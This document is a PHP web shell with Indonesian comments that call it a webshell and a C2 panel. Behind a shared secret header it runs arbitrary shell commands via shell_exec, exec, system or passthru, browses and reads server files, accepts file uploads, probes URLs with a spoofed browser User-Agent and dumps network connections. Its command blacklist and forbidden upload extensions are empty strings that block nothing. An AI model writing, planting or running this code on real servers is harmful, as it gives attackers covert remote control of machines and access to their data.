<?php

session_start();

// --- AUTHENTIKASI & KEAMANAN (SANGAT PENTING!) ---
// Anda HARUS mengimplementasikan mekanisme autentikasi dan kunci rahasia yang kuat.
// Tanpa ini, webshell Anda adalah pintu belakang terbuka.
// Contoh sederhana (JANGAN GUNAKAN UNTUK PRODUKSI):
define('AUTH_SECRET_KEY', 'YourVeryStrongAndUniqueSecretKeyHere123!'); // GANTI DENGAN KUNCI ASLI!
if (!isset($_SERVER['HTTP_X_SECRET_KEY']) || $_SERVER['HTTP_X_SECRET_KEY'] !== AUTH_SECRET_KEY) {
    // Tambahkan log atau mekanisme lain untuk percobaan akses tidak sah
    header('HTTP/1.1 401 Unauthorized');
    die('Access Denied');
}
// ---

function execute_command($cmd) {
    // Sanitasi input (sangat dasar, HARUS lebih kuat di produksi)
    $cmd = escapeshellcmd($cmd); // Menghindari beberapa serangan injeksi perintah
    // Perintah yang sering digunakan oleh webshell, mungkin ingin memfilter ini
    $blacklist = ['', '', '', ' ']; // Tambahkan perintah berbahaya lain
    foreach ($blacklist as $bad_cmd) {
        if (strpos($cmd, $bad_cmd) !== false) {
            return "Error: Command blocked for security reasons.";
        }
    }

    if (function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    return "Error: No command execution functions available.";
}

function get_current_dir() {
    return getcwd();
}

function list_directory($dir = '.') {
    // Sanitasi input
    $dir = str_replace(array("\0", ".."), '', $dir); // Hapus null byte dan .. untuk keamanan dasar
    $dir = realpath($dir); // Ambil jalur asli

    if ($dir === false || !is_dir($dir)) {
        return "Error: Directory not found or inaccessible.";
    }

    $files = @scandir($dir);
    if ($files === false) {
        return "Error: Could not list directory.";
    }
    $output = [];
    foreach ($files as $file) {
        // Abaikan "." dan ".."
        if ($file === '.' || $file === '..') {
            continue;
        }
        $path = $dir . '/' . $file;
        $type = '';
        if (is_dir($path)) {
            $type = 'dir';
        } elseif (is_file($path)) {
            $type = 'file';
        }
        $output[] = ['name' => $file, 'type' => $type, 'path' => $path];
    }
    return $output;
}

function read_file_content($filepath) {
    // Sanitasi input
    $filepath = str_replace(array("\0", ".."), '', $filepath);
    $filepath = realpath($filepath);

    if ($filepath === false || !file_exists($filepath) || !is_readable($filepath)) {
        return "Error: File not found or not readable.";
    }
    return file_get_contents($filepath);
}

function upload_file($target_dir, $file_info) {
    // Sanitasi input
    $target_dir = str_replace(array("\0", ".."), '', $target_dir);
    $target_dir = realpath($target_dir);

    if ($target_dir === false || !is_dir($target_dir) || !is_writable($target_dir)) {
        return "Error: Target directory is not valid or not writable: " . htmlspecialchars($target_dir);
    }

    if (!isset($file_info['name']) || $file_info['error'] !== UPLOAD_ERR_OK) {
        return "Error: File upload failed with error code " . $file_info['error'];
    }

    $filename = basename($file_info['name']); // Hanya nama file, tanpa path
    // Filter ekstensi berbahaya jika perlu
    $forbidden_ext = ['', '', '', '', '', '', '', ''];
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    if (in_array(strtolower($ext), $forbidden_ext)) {
        return "Error: Upload of this file type is forbidden.";
    }


    $target_file = $target_dir . '/' . $filename;
    if (move_uploaded_file($file_info['tmp_name'], $target_file)) {
        return "File " . htmlspecialchars($filename) . " uploaded successfully to " . $target_file;
    } else {
        return "Error: There was an error uploading your file.";
    }
}

// --- NEW FEATURES ---

// Function to check site status
function check_site_status($url) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['status' => 'error', 'message' => 'Invalid URL provided.'];
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_NOBODY, true); // Hanya head
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Ikuti redirect
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout 10 detik
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); // Spoof User-Agent
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code >= 200 && $http_code < 400) {
        return ['status' => 'online', 'http_code' => $http_code];
    } else if ($http_code >= 400) {
        return ['status' => 'offline', 'http_code' => $http_code, 'message' => 'Client/Server Error'];
    } else {
        return ['status' => 'offline', 'http_code' => $http_code, 'message' => 'Could not connect or unknown error.'];
    }
}

// Function to get network traffic info (basic)
function get_network_traffic_info() {
    $os = strtolower(php_uname('s'));
    $output = "Network info (basic):\n";

    if (strpos($os, 'linux') !== false) {
        $output .= "--- Open Ports & Connections (Linux: ss -tuln) ---\n";
        $output .= execute_command('ss -tuln');
        $output .= "\n--- Network Interfaces (Linux: ip a) ---\n";
        $output .= execute_command('ip a');
    } elseif (strpos($os, 'win') !== false) {
        $output .= "--- Open Ports & Connections (Windows: netstat -ano) ---\n";
        $output .= execute_command('netstat -ano');
        $output .= "\n--- Network Interfaces (Windows: ipconfig /all) ---\n";
        $output .= execute_command('ipconfig /all');
    } else {
        $output .= "Unsupported OS for detailed network info. Trying generic netstat...\n";
        $output .= execute_command('netstat -tuln || netstat -an');
    }
    return $output;
}


// --- Handle AJAX Requests ---
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    header('Content-Type: application/json');
    $response = ['status' => 'error', 'message' => 'Invalid action'];

    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'execute':
                if (isset($_POST['command'])) {
                    $response['status'] = 'success';
                    $response['output'] = execute_command($_POST['command']);
                }
                break;
            case 'ls':
                $dir = isset($_POST['path']) ? $_POST['path'] : get_current_dir();
                $_SESSION['current_dir'] = $dir;
                $response['status'] = 'success';
                $response['output'] = list_directory($dir);
                break;
            case 'cd':
                $target_dir = isset($_POST['path']) ? $_POST['path'] : '/';
                if (@chdir($target_dir)) {
                    $_SESSION['current_dir'] = getcwd();
                    $response['status'] = 'success';
                    $response['output'] = getcwd();
                } else {
                    $response['status'] = 'error';
                    $response['message'] = "Cannot change directory to " . htmlspecialchars($target_dir);
                    $response['output'] = getcwd();
                }
                break;
            case 'read_file':
                if (isset($_POST['filepath'])) {
                    $response['status'] = 'success';
                    $response['output'] = read_file_content($_POST['filepath']);
                }
                break;
            case 'check_site': // NEW ACTION
                if (isset($_POST['url'])) {
                    $result = check_site_status($_POST['url']);
                    $response['status'] = 'success'; // Status C2 panel
                    $response['site_status'] = $result; // Status situs dari webshell
                }
                break;
            case 'get_network_traffic': // NEW ACTION
                $response['status'] = 'success';
                $response['output'] = get_network_traffic_info();
                break;
        }
    }

    echo json_encode($response);
    exit();
}

// --- Handle File Upload ---
if (isset($_FILES['file_to_upload']) && isset($_POST['upload_dir'])) {
    // Periksa kunci rahasia untuk otentikasi upload juga
    if (!isset($_SERVER['HTTP_X_SECRET_KEY']) || $_SERVER['HTTP_X_SECRET_KEY'] !== AUTH_SECRET_KEY) {
        header('HTTP/1.1 401 Unauthorized');
        die('Access Denied');
    }

    header('Content-Type: application/json');
    $response = ['status' => 'error', 'message' => 'Upload failed'];
    $upload_dir = $_POST['upload_dir'];

    // Basic validation for upload directory
    if (!is_dir($upload_dir) || !is_writable($upload_dir)) {
        $response['message'] = "Target directory is not valid or not writable: " . htmlspecialchars($upload_dir);
    } else {
        $upload_result = upload_file($upload_dir, $_FILES['file_to_upload']);
        if (strpos($upload_result, 'Error:') === false) {
            $response['status'] = 'success';
            $response['message'] = $upload_result;
        } else {
            $response['message'] = $upload_result;
        }
    }
    echo json_encode($response);
    exit();
}

// Untuk webshell, biasanya tidak ada tampilan HTML. Ini hanya untuk memastikan jika diakses langsung.
header('HTTP/1.1 403 Forbidden');
echo 'You are not supposed to be here.';
exit();
?>
